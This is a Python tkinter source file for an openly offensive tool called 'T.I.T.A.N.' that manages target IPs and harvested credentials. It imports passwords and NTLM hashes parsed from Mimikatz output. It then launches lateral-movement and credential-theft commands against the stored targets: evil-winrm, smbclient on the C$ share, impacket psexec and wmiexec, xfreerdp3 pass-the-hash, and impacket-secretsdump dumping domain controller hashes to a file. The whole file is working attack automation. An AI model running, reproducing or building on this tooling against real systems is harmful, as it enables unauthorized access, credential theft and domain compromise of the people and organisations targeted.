import json
import os
import subprocess
import re
import threading
import tkinter as tk
from tkinter import messagebox, filedialog, ttk, simpledialog
from datetime import datetime

# --- CONFIGURATION & THEME ---
BG_DARK = "#121212"
BG_PANEL = "#1E1E1E"
ACCENT = "#00ADB5"
TEXT_PRIMARY = "#EEEEEE"
TEXT_DIM = "#999999"
SUCCESS_GREEN = "#2ECC71"
FAIL_RED = "#E74C3C"

# Path persistence: targets.json remains in the TITAN directory as requested
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
CONFIG_FILE = os.path.join(SCRIPT_DIR, "targets.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "titan_history.log")

class TitanGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("T.I.T.A.N.")
        self.root.geometry("850x920")
        self.root.configure(bg=BG_DARK)
        
        self.data = self.load_config()
        self.tool_btns = {} 
        self.setup_styles()
        self.create_widgets()
        self.log_event("Session Started")

    def load_config(self):
        if not os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "w") as f: json.dump({}, f)
        try:
            with open(CONFIG_FILE, "r") as f: return json.load(f)
        except: return {}

    def save_config(self):
        with open(CONFIG_FILE, "w") as f: json.dump(self.data, f, indent=4)

    def log_event(self, message):
        """Appends a timestamped message to the titan_history.log file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"[{timestamp}] {message}\n")
        except Exception as e:
            print(f"Logging error: {e}")

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TCombobox", fieldbackground=BG_PANEL, background=ACCENT, foreground="black")
        style.configure("TLabelframe", background=BG_DARK, foreground=ACCENT, bordercolor=ACCENT)
        style.configure("TLabelframe.Label", background=BG_DARK, foreground=ACCENT, font=("Courier", 10, "bold"))

    def create_widgets(self):
        header = tk.Frame(self.root, bg=BG_DARK)
        header.pack(fill="x", pady=15)
        tk.Label(header, text="T.I.T.A.N.", font=("Courier", 32, "bold"), fg=ACCENT, bg=BG_DARK).pack()
        tk.Label(header, text="Taylor's Interactive Tool for Attack Navigation", 
                 font=("Courier", 10, "italic"), fg=TEXT_DIM, bg=BG_DARK).pack()

        # Step 1: Target Ingestion
        reg_frame = ttk.LabelFrame(self.root, text=" 01: TARGET CONFIG ")
        reg_frame.pack(fill="x", padx=20, pady=5)
        f1 = tk.Frame(reg_frame, bg=BG_DARK)
        f1.pack(pady=10)
        
        tk.Label(f1, text="IP:", fg=TEXT_DIM, bg=BG_DARK).grid(row=0, column=0)
        self.ip_entry = tk.Entry(f1, bg=BG_PANEL, fg=ACCENT, insertbackground=ACCENT)
        self.ip_entry.grid(row=0, column=1, padx=10)
        
        tk.Label(f1, text="HOST:", fg=TEXT_DIM, bg=BG_DARK).grid(row=0, column=2)
        self.host_entry = tk.Entry(f1, bg=BG_PANEL, fg=ACCENT, insertbackground=ACCENT)
        self.host_entry.grid(row=0, column=3, padx=10)

        # Step 2: Credential Ingestion
        cred_frame = ttk.LabelFrame(self.root, text=" 02: CREDENTIAL INGESTION ")
        cred_frame.pack(fill="x", padx=20, pady=5)
        f2 = tk.Frame(cred_frame, bg=BG_DARK)
        f2.pack(pady=10)

        tk.Label(f2, text="USER:", fg=TEXT_DIM, bg=BG_DARK).grid(row=0, column=0)
        self.user_entry = tk.Entry(f2, bg=BG_PANEL, fg=TEXT_PRIMARY, width=15)
        self.user_entry.grid(row=0, column=1, padx=5)

        tk.Label(f2, text="SECRET:", fg=TEXT_DIM, bg=BG_DARK).grid(row=0, column=2)
        self.secret_entry = tk.Entry(f2, bg=BG_PANEL, fg=TEXT_PRIMARY, width=15)
        self.secret_entry.grid(row=0, column=3, padx=5)

        tk.Label(f2, text="NOTES:", fg=TEXT_DIM, bg=BG_DARK).grid(row=0, column=4)
        self.notes_entry = tk.Entry(f2, bg=BG_PANEL, fg=TEXT_PRIMARY, width=20)
        self.notes_entry.grid(row=0, column=5, padx=5)

        tk.Button(cred_frame, text="✚ ADD MANUAL", command=self.add_manual, bg=ACCENT, fg="black", width=15).pack(side="left", padx=50, pady=5)
        tk.Button(cred_frame, text="📂 MIMIKATZ IMPORT", command=self.import_mimi, bg="#393E46", fg=TEXT_PRIMARY, width=18).pack(side="right", padx=50, pady=5)

        # Step 3: Dispatch Control
        strike_frame = ttk.LabelFrame(self.root, text=" 03: DISPATCH CONTROL ")
        strike_frame.pack(fill="both", expand=True, padx=20, pady=10)

        t_row = tk.Frame(strike_frame, bg=BG_DARK)
        t_row.pack(pady=5, fill="x", padx=100)
        self.target_cb = ttk.Combobox(t_row, values=list(self.data.keys()), state="readonly")
        self.target_cb.pack(side="left", expand=True, fill="x")
        self.target_cb.set("-- SELECT TARGET --")
        self.target_cb.bind("<<ComboboxSelected>>", self.update_creds)
        tk.Button(t_row, text="⚡ PING", command=self.check_reachability, bg="#393E46", fg=ACCENT, font=("Courier", 8, "bold"), width=8).pack(side="left", padx=5)

        c_row = tk.Frame(strike_frame, bg=BG_DARK)
        c_row.pack(pady=5, fill="x", padx=100)
        self.cred_cb = ttk.Combobox(c_row, state="readonly")
        self.cred_cb.pack(side="left", expand=True, fill="x")
        self.cred_cb.set("-- SELECT CREDENTIAL --")
        tk.Button(c_row, text="⚙ MANAGE", command=self.open_cred_manager, bg="#393E46", fg=ACCENT, font=("Courier", 8, "bold"), width=8).pack(side="left", padx=5)

        grid = tk.Frame(strike_frame, bg=BG_DARK)
        grid.pack(pady=10)
        tools = ["Evil-WinRM", "SMBClient", "Psexec", "WMIExec", "XFreeRDP3", "SecretsDump"]
        for i, tool in enumerate(tools):
            btn = tk.Button(grid, text=tool.upper(), command=lambda t=tool: self.launch(t), 
                            bg=BG_PANEL, fg=ACCENT, width=15, height=2)
            btn.grid(row=i//3, column=i%3, padx=10, pady=10)
            self.tool_btns[tool] = btn

        tk.Button(strike_frame, text="☢ EXECUTE ALL-TOOL TEST ☢", command=self.test_all_tools, 
                  bg="#D35400", fg="white", font=("Courier", 10, "bold"), height=2).pack(fill="x", padx=100, pady=10)

    def get_cmd(self, tool, target_ip, user, secret, c_type):
        impacket_secret = f"aad3b435b51404eeaad3b435b51404ee:{secret}" if c_type == "hash" else secret
        
        if tool == "Evil-WinRM": 
            return f"evil-winrm -i {target_ip} -u '{user}' " + (f"-H {secret}" if c_type == "hash" else f"-p '{secret}'")
        
        elif tool == "SMBClient": 
            return f"smbclient //{target_ip}/C$ -U '{user}'" + (f" --pw-nt-hash {secret}" if c_type == "hash" else f"%'{secret}'") + " -c 'ls'"
        
        elif tool == "SecretsDump": 
            clean_user = user
            if "\\" in user:
                clean_user = user.split("\\")[-1]
            if c_type == "hash": 
                return f"impacket-secretsdump -just-dc -hashes {impacket_secret} '{clean_user}'@{target_ip}"
            else: 
                return f"impacket-secretsdump -just-dc '{clean_user}:{secret}'@{target_ip}"
        
        elif tool == "Psexec": 
            return f"impacket-psexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip} whoami"
        
        elif tool == "WMIExec": 
            return f"impacket-wmiexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip} 'whoami'"
        
        elif tool == "XFreeRDP3": 
            return f"xfreerdp3 /v:{target_ip} /u:'{user}' " + (f"/pth:{secret}" if c_type == "hash" else f"/p:'{secret}'") + " /cert:ignore +auth-only"
        
        return ""

    def test_all_tools(self):
        target_ip = self.target_cb.get()
        idx = self.cred_cb.current()
        if idx == -1 or target_ip == "-- SELECT TARGET --": return
        
        cred = self.data[target_ip]['creds'][idx]
        user, secret, c_type = cred['user'], cred['secret'], cred['type']

        def run_tests():
            # Define specific strings that indicate a functional failure despite a "clean" exit
            silent_fail_strings = [
                "is not writable",
                "access_denied",
                "connection refused",
                "was cannot"
            ]
            
            for tool, btn in self.tool_btns.items():
                if tool == "Evil-WinRM": continue
                
                btn.config(bg="#34495E", fg="white") 
                cmd = self.get_cmd(tool, target_ip, user, secret, c_type)
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    # Combine stdout and stderr for a comprehensive search
                    combined_output = (result.stdout + result.stderr).lower()
                    
                    # 1. Check return code
                    # 2. Check for known failure keywords
                    # 3. Check for the specific "not writable" or empty output issue
                    is_failed = (
                        result.returncode != 0 or 
                        any(msg in combined_output for msg in silent_fail_strings) or
                        (tool in ["Psexec", "WMIExec"] and not result.stdout.strip())
                    )

                    if is_failed:
                        btn.config(bg=FAIL_RED, fg="white")
                        self.log_event(f"FUNCTIONAL FAIL: {tool} on {target_ip} - {combined_output[:50]}...")
                    else:
                        btn.config(bg=SUCCESS_GREEN, fg="black")
                        self.log_event(f"TEST SUCCESS: {tool} on {target_ip}")
                except Exception as e:
                    btn.config(bg=FAIL_RED, fg="white")
                    self.log_event(f"EXECUTION ERROR: {tool} - {str(e)}")
        
        threading.Thread(target=run_tests, daemon=True).start()

    def update_creds(self, event=None):
        target = self.target_cb.get()
        if target in self.data:
            display = []
            for c in self.data[target]['creds']:
                note_snippet = f" | {c.get('notes', '')[:20]}" if c.get('notes') else ""
                display.append(f"{c['user']} [{c['type']}]{note_snippet}")
            self.cred_cb['values'] = display
            if display: self.cred_cb.current(0)
        for btn in self.tool_btns.values(): btn.config(bg=BG_PANEL, fg=ACCENT)

    def open_cred_manager(self):
        target = self.target_cb.get()
        if target == "-- SELECT TARGET --": return
        win = tk.Toplevel(self.root); win.title(f"T.I.T.A.N. Manager: {target}"); win.geometry("650x450"); win.configure(bg=BG_DARK)
        f = tk.Frame(win, bg=BG_DARK); f.pack(fill="both", expand=True, padx=10, pady=10)
        self.refresh_manager_list(f, target)

    def refresh_manager_list(self, frame, target):
        for w in frame.winfo_children(): w.destroy()
        for i, cred in enumerate(self.data[target]['creds']):
            r = tk.Frame(frame, bg=BG_PANEL, pady=5); r.pack(fill="x", pady=2)
            tk.Label(r, text=f"{cred['user']} | Notes: {cred.get('notes','---')}", fg=TEXT_PRIMARY, bg=BG_PANEL, anchor="w", width=50).pack(side="left", padx=5)
            tk.Button(r, text="DEL", bg="#FF4C4C", fg="white", width=4, command=lambda idx=i: self.delete_cred(target, idx, frame)).pack(side="right", padx=2)
            tk.Button(r, text="EDIT", bg="#393E46", fg=ACCENT, width=4, command=lambda idx=i: self.edit_cred(target, idx, frame)).pack(side="right", padx=2)

    def edit_cred(self, target, idx, frame):
        c = self.data[target]['creds'][idx]
        u = simpledialog.askstring("Edit", "User:", initialvalue=c['user'], parent=self.root)
        if not u: return
        s = simpledialog.askstring("Edit", "Secret:", initialvalue=c['secret'], parent=self.root)
        if not s: return
        n = simpledialog.askstring("Edit", "Notes:", initialvalue=c.get('notes', ''), parent=self.root)
        self.data[target]['creds'][idx].update({"user": u, "secret": s, "notes": n if n else ""})
        self.data[target]['creds'][idx]['type'] = "hash" if len(s) == 32 and all(x in "0123456789abcdefABCDEF" for x in s) else "password"
        self.save_config(); self.refresh_manager_list(frame, target); self.update_creds()
        self.log_event(f"CREDENTIAL EDITED: {u} on {target}")

    def delete_cred(self, target, idx, frame):
        user = self.data[target]['creds'][idx]['user']
        if messagebox.askyesno("Confirm", "Delete this credential?"):
            del self.data[target]['creds'][idx]
            self.save_config(); self.refresh_manager_list(frame, target); self.update_creds()
            self.log_event(f"CREDENTIAL DELETED: {user} on {target}")

    def add_manual(self):
        ip, host, user, secret, notes = self.ip_entry.get(), self.host_entry.get(), self.user_entry.get(), self.secret_entry.get(), self.notes_entry.get()
        if not all([ip, host, user, secret]): return messagebox.showerror("Error", "Missing required fields.")
        if ip not in self.data: self.data[ip] = {"hostname": host, "creds": []}
        c_type = "hash" if len(secret) == 32 and all(x in "0123456789abcdefABCDEF" for x in secret) else "password"
        if self.add_unique(ip, user, c_type, secret, notes):
            self.save_config(); self.target_cb['values'] = list(self.data.keys()); self.update_creds()
            self.log_event(f"TARGET ADDED: {user}@{ip}")

    def add_unique(self, ip, user, c_type, secret, notes=""):
        if any(c['user'] == user and c['secret'] == secret for c in self.data[ip]['creds']): return False
        self.data[ip]['creds'].append({"user": user, "type": c_type, "secret": secret, "notes": notes, "added": datetime.now().strftime("%Y-%m-%d %H:%M")})
        return True

    def check_reachability(self):
        ip = self.target_cb.get()
        if ip == "-- SELECT TARGET --": return
        res = subprocess.run(["ping", "-c", "1", "-W", "2", ip], stdout=subprocess.DEVNULL)
        if res.returncode == 0:
            messagebox.showinfo("Ping", f"Target {ip} is REACHABLE")
            self.log_event(f"REACHABILITY: {ip} is UP")
        else:
            messagebox.showerror("Ping", f"Target {ip} is UNREACHABLE")
            self.log_event(f"REACHABILITY: {ip} is DOWN")

    def launch(self, tool):
        target_ip = self.target_cb.get()
        idx = self.cred_cb.current()
        if idx == -1 or target_ip == "-- SELECT TARGET --": return
        cred = self.data[target_ip]['creds'][idx]
        
        cmd = self.get_cmd(tool, target_ip, cred['user'], cred['secret'], cred['type'])
        
        if cmd:
            # Strip test flags if present
            launch_cmd = cmd.replace(" -c 'ls'", "").replace(" +auth-only", "").replace(" -c 'whoami'", "").replace(" 'whoami'", "")
            
            # CUSTOM LOGIC FOR SECRETSDUMP FILE OUTPUT
            if tool == "SecretsDump":
                output_file = f"{target_ip}_secretsdump.txt"
                # Use 'tee' so you can still see the output in the terminal while it saves to the file
                launch_cmd = f"{launch_cmd} | tee {output_file}"
                self.log_event(f"LOGGING OUTPUT TO: {output_file}")

            # Launch in a new terminal so the GUI doesn't freeze
            subprocess.Popen(['x-terminal-emulator', '-e', f'bash -c "{launch_cmd}; exec bash"'])
            self.log_event(f"TOOL LAUNCHED: {tool} on {target_ip} as {cred['user']}")

    def import_mimi(self):
        """Advanced parser: Prioritizes cleartext passwords, falls back to NTLM hashes."""
        file_path = filedialog.askopenfilename(title="Select Mimikatz Output", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not file_path: return
        
        target_ip = self.ip_entry.get()
        if not target_ip:
            messagebox.showwarning("Input Required", "Please enter a Target IP in Step 1 before importing.")
            return

        try:
            # Handle potential UTF-16 encoding from Mimikatz logs
            try:
                with open(file_path, "r", encoding="utf-16") as f:
                    content = f.read()
            except (UnicodeError, UnicodeDecodeError):
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            
            # Split by Authentication Id to isolate distinct user sessions
            sessions = content.split('Authentication Id :')
            count = 0
            
            for session in sessions:
                # 1. Identify User and Domain
                user_match = re.search(r'\* Username : (.+)', session)
                dom_match = re.search(r'\* Domain\s+: (.+)', session)
                
                if not user_match: continue
                
                user = user_match.group(1).strip()
                domain = dom_match.group(1).strip() if dom_match else ""
                
                # Skip machine accounts and empty entries
                if user == '(null)' or user.endswith('$'): continue
                
                # 2. Priority Logic: Scan for any cleartext password in the session
                passwords = re.findall(r'\* Password : (.*)', session)
                cleartext = None
                for p in passwords:
                    p_clean = p.strip()
                    if p_clean and p_clean != '(null)':
                        cleartext = p_clean
                        break 

                # 3. Fallback: Identify NTLM Hash
                ntlm_match = re.search(r'\* NTLM\s+: ([a-fA-F0-9]{32})', session)
                ntlm_hash = ntlm_match.group(1).strip() if ntlm_match else None

                # 4. Ingest into TITAN Data
                if target_ip not in self.data:
                    self.data[target_ip] = {"hostname": self.host_entry.get() or "Imported", "creds": []}
                
                full_user = f"{domain}\\{user}" if domain and domain != "LOCAL" else user
                
                # Apply User Choice: Password if found, else NTLM
                if cleartext:
                    if self.add_unique(target_ip, full_user, "password", cleartext, "Mimi Cleartext"):
                        count += 1
                elif ntlm_hash:
                    if self.add_unique(target_ip, full_user, "hash", ntlm_hash, "Mimi NTLM"):
                        count += 1
            
            self.save_config()
            self.target_cb['values'] = list(self.data.keys())
            self.update_creds()
            self.log_event(f"MIMIKATZ IMPORT: Processed {count} credentials for {target_ip}")
            messagebox.showinfo("Import Complete", f"Successfully imported {count} credentials for {target_ip}.")
            
        except Exception as e:
            self.log_event(f"MIMIKATZ IMPORT ERROR: {str(e)}")
            messagebox.showerror("Error", f"Failed to parse file: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = TitanGUI(root)
    root.mainloop()
